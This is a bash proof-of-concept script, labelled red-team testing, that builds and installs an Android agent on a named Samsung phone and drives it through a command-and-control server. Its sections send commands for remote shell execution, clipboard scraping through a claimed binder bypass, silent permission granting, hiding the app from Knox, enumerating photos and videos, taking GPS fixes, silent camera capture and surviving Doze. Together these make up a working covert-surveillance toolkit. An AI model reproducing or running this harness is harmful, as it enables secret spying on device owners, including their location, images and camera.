#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# SYNAPSE — MANUAL TEST PoC SCRIPT
# Android 16 Red Team Agent — End-to-End Verification
# Target: Samsung SM-A356B, One UI 8.5, patch 2026-07-05
# ═══════════════════════════════════════════════════════════════

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

DEVICE="a2a99ec51033f84f"
SERVER="https://localhost:8443"
APK="$HOME/UMBRA/Umbra-Client/app/build/outputs/apk/debug/app-debug.apk"

cmd() {
    local module="$1" action="$2" params="$3"
    local json
    if [ -z "$params" ]; then
        json="{\"device_id\":\"$DEVICE\",\"module\":\"$module\",\"action\":\"$action\"}"
    else
        json="{\"device_id\":\"$DEVICE\",\"module\":\"$module\",\"action\":\"$action\",\"params\":$params}"
    fi
    local status
    status=$(curl -k -s -X POST "$SERVER/api/command" \
        -H "Content-Type: application/json" -d "$json" | python3 -c "import json,sys; print(json.load(sys.stdin).get('status','?'))" 2>/dev/null)
    if [ "$status" = "sent" ]; then
        echo -e "${GREEN}[SENT]${NC} $module/$action"
    else
        echo -e "${RED}[$status]${NC} $module/$action"
    fi
    sleep 0.3
}

banner() {
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗"
    echo -e "║           SYNAPSE PoC — Manual Test Suite                  ║"
    echo -e "╚══════════════════════════════════════════════════════════════╝${NC}"
}

section() {
    echo -e "\n${YELLOW}─── $1 ───${NC}"
}

# ═══════════════════════════════════════════════════════════════
# STEP 0 — BUILD & DEPLOY
# ═══════════════════════════════════════════════════════════════

banner

section "BUILD"
echo -n "Building APK... "
cd "$HOME/UMBRA/Umbra-Client"
export JAVA_HOME="$HOME/.local/share/JetBrains/Toolbox/apps/android-studio/jbr"
./gradlew assembleDebug -q 2>&1 | tail -1
echo -e "${GREEN}DONE${NC}"

echo -n "Installing... "
adb install -r "$APK" 2>&1 | tail -1

echo -n "Granting permissions... "
adb shell pm grant org.synapse.core android.permission.POST_NOTIFICATIONS 2>/dev/null
adb shell pm grant org.synapse.core android.permission.CAMERA 2>/dev/null
adb shell pm grant org.synapse.core android.permission.ACCESS_FINE_LOCATION 2>/dev/null
adb shell pm grant org.synapse.core android.permission.READ_MEDIA_IMAGES 2>/dev/null
adb shell pm grant org.synapse.core android.permission.READ_MEDIA_VIDEO 2>/dev/null
adb shell pm grant org.synapse.core android.permission.READ_PHONE_STATE 2>/dev/null
echo -e "${GREEN}DONE${NC}"

echo -n "Launching... "
adb shell am force-stop org.synapse.core 2>/dev/null
adb shell am start -n org.synapse.core/.MainActivity 2>&1 | tail -1
sleep 4

echo -n "Server check... "
curl -k -s "$SERVER/api/health" | python3 -c "import json,sys; d=json.load(sys.stdin); print('OK' if d.get('status')=='ok' else 'DOWN')" 2>/dev/null || echo "DOWN"

echo -n "Agent online... "
curl -k -s "$SERVER/api/devices" | python3 -c "
import json,sys
devs=json.load(sys.stdin)
for d in devs:
    if d.get('device_id')=='$DEVICE':
        print('YES' if d.get('online') else 'NO')
        break
else:
    print('NOT REGISTERED')
" 2>/dev/null

# ═══════════════════════════════════════════════════════════════
# STEP 1 — C2 TRANSPORT TESTS
# ═══════════════════════════════════════════════════════════════

section "C2 TRANSPORT"

echo -e "${CYAN}1.1 Ping${NC}"
cmd "ping" "ping"

echo -e "${CYAN}1.2 Device Info${NC}"
cmd "info" "gather"

echo -e "${CYAN}1.3 Shell — whoami${NC}"
cmd "shell" "exec" '{"cmd":"id"}'

echo -e "${CYAN}1.4 Shell — properties${NC}"
cmd "shell" "exec" '{"cmd":"getprop ro.build.version.sdk"}'

# ═══════════════════════════════════════════════════════════════
# STEP 2 — SAMSUNG EXPLOIT TESTS
# ═══════════════════════════════════════════════════════════════

section "SAMSUNG EXPLOITS"

echo -e "${CYAN}2.1 SemClipboard — binder bypass${NC}"
cmd "semclipboard" "scrape"

echo -e "${CYAN}2.2 Silent Permission Grant — full sweep${NC}"
cmd "silent_grant" "grant"

echo -e "${CYAN}2.3 KnoxGuard — hide app${NC}"
cmd "knox_hide_v2" "hide"

echo -e "${CYAN}2.4 KnoxGuard — diagnostic${NC}"
cmd "knox_check" "check"

# ═══════════════════════════════════════════════════════════════
# STEP 3 — ESPIONAGE MODULES
# ═══════════════════════════════════════════════════════════════

section "ESPIONAGE"

echo -e "${CYAN}3.1 File enumeration — last 10 photos${NC}"
cmd "files" "list" '{"type":"images","count":"10"}'

echo -e "${CYAN}3.2 File enumeration — last 5 videos${NC}"
cmd "files" "list" '{"type":"videos","count":"5"}'

echo -e "${CYAN}3.3 Location — GPS fix${NC}"
cmd "location" "get"

echo -e "${CYAN}3.4 Camera — silent capture${NC}"
cmd "camera" "capture"

# ═══════════════════════════════════════════════════════════════
# STEP 4 — PERSISTENCE TESTS
# ═══════════════════════════════════════════════════════════════

section "PERSISTENCE"

echo -e "${CYAN}4.1 Foreground service status${NC}"
adb shell dumpsys activity services org.synapse.core | grep -E "foreground|specialUse" | head -3

echo -e "${CYAN}4.2 Process alive${NC}"
adb shell ps -A | grep synapse || echo "NOT FOUND"

echo -e "${CYAN}4.3 Simulate Doze${NC}"
adb shell dumpsys deviceidle force-idle
sleep 5
echo -n "Service after Doze: "
adb shell dumpsys activity services org.synapse.core | grep -c "foreground=true" || echo "DEAD"

echo -e "${CYAN}4.4 Exit Doze${NC}"
adb shell dumpsys deviceidle unforce

# ═══════════════════════════════════════════════════════════════
# STEP 5 — RESULTS
# ═══════════════════════════════════════════════════════════════

section "RESULTS"

echo -e "${CYAN}Fetching server results...${NC}"
sleep 3
echo ""

# Show only the command response data, not the encrypted wrappers
curl -k -s "$SERVER/api/devices" | python3 -c "
import json,sys
devs=json.load(sys.stdin)
print(f'Devices online: {len([d for d in devs if d[\"online\"]])}')
print(f'Total registered: {len(devs)}')
print()
" 2>/dev/null

echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗"
echo -e "║              PoC Complete — Check server.log for data       ║"
echo -e "╚══════════════════════════════════════════════════════════════╝${NC}"
